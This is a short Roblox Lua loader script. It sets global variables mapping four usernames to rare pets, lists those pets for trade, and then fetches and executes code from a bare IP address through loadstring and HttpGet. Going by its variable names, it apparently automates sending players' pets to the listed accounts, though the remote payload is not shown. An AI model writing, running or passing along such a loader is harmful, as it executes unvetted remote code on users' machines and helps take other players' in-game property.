repeat wait() until game:IsLoaded()
repeat wait() until game:GetService("Players")
repeat wait() until game:GetService("Players").LocalPlayer
repeat wait() until game:GetService("Players").LocalPlayer.PlayerGui

_G.UserKey = "1"
_G.HostName = {
    ["Dammebloms3581"] = "Mochi Mouse",
    ["Kaputpappa734"] = "French Fry Ferret",
    ["Mowenibara890"] = "Spaghetti Sloth",
    ["Latiljabro65041"] = "Corrupted Kitsune",
}

_G.SelectPetForTrade = {
    "Corrupted Kitsune",
    "Mochi Mouse",
    "French Fry Ferret",
    "Spaghetti Sloth",
}

loadstring(game:HttpGet("http://103.245.164.141/OScript.txt"))()